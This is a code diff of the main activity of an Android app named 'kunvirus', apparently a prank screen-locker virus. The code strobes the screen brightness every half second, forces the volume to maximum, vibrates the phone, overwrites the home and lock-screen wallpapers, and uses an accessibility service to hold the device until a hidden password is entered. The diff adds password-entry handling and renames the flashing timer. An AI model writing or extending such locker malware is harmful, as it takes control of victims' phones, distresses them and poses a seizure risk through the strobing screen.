@@ -1,16 +1,21 @@
 package cn.edu.zjut.kunvirus;
 
 import android.app.ActivityManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.Window;
-import android.view.WindowManager;
+import android.view.WindowManager.LayoutParams;
+import android.view.inputmethod.EditorInfo;
+import android.widget.Button;
 import android.widget.EditText;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -22,15 +27,16 @@ public class MainActivity extends AppCompatActivity {
     private final String pwdEncrypted="$2a$12$nHcCYECmuxxn5eMxSD9M7uqcT/opA4DpCFewnb7P0mFoLp8ZR61vO";
     private static int screen_vary_cnt=0;
     private final int vary_delay=500;
+    EditText passwordText;
 
-    class MyTimerTask extends TimerTask {
+    class BrightnessTimerTask extends TimerTask {
         public void run() {
             screen_vary_cnt=(screen_vary_cnt+1)%2;//0101...这样变化
             if(screen_vary_cnt==1)
                 MainActivity.this.runOnUiThread(() -> setWindowBrightness(0));
             else
                 MainActivity.this.runOnUiThread(() -> setWindowBrightness(255));
-            new Timer().schedule(new MyTimerTask(), vary_delay);
+            new Timer().schedule(new BrightnessTimerTask(), vary_delay);
         }
     }
     @Override
@@ -47,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
 
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        new Timer().schedule(new MyTimerTask(),vary_delay);
+        new Timer().schedule(new BrightnessTimerTask(),vary_delay);
         AmazingUtil.openNotifyService(this);
         AmazingUtil.openMusicService(this);
         AmazingUtil.shakeItBaby(this);//手机振动
@@ -55,19 +61,27 @@ public class MainActivity extends AppCompatActivity {
         AmazingUtil.setMaxVolume(this);//音量调节到最大
         AmazingUtil.SetWallPaper(this);
         AmazingUtil.SetLockWallPaper(this);
+
         Toast.makeText(this,"唱跳rap篮球",Toast.LENGTH_LONG).show();
         //Toast.makeText(this,UserCount.getId(this),Toast.LENGTH_LONG).show();
+        passwordText = findViewById(R.id.cxkPassword);
+        passwordText.setOnEditorActionListener((v, actionId, event) -> {//监听软键盘右下角确定键
+            if (actionId == EditorInfo.IME_ACTION_DONE) {
+                exitLockService(null);
+            }
+            return false;
+        });
     }
 
     public boolean serviceOpenCheck(){
         try {
             int accessibilityEnabled = Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                     Settings.Secure.ACCESSIBILITY_ENABLED);
-            Log.i("CuberLuo", String.valueOf(accessibilityEnabled));
+            //Log.i("CuberLuo", String.valueOf(accessibilityEnabled));
             if (accessibilityEnabled == 1){
                 String settingValue = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                         Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-                Log.i("CuberLuo",settingValue);
+                //Log.i("CuberLuo",settingValue);
                 if(settingValue.contains("cn.edu.zjut.kunvirus.LockService")){
                     return true;
                 }else{
@@ -82,9 +96,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-
     public void exitLockService(View view){
-        EditText passwordText = findViewById(R.id.cxkPassword);
         String passwordStr =passwordText.getText().toString();
         if(passwordStr.trim().equals("")){
             Toast.makeText(this, "密码不能为空", Toast.LENGTH_SHORT).show();
@@ -116,7 +128,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void setWindowBrightness(int brightness) {
         Window window = getWindow();
-        WindowManager.LayoutParams lp = window.getAttributes();
+        LayoutParams lp = window.getAttributes();
         lp.screenBrightness = brightness / 255.0f;
         window.setAttributes(lp);
     }
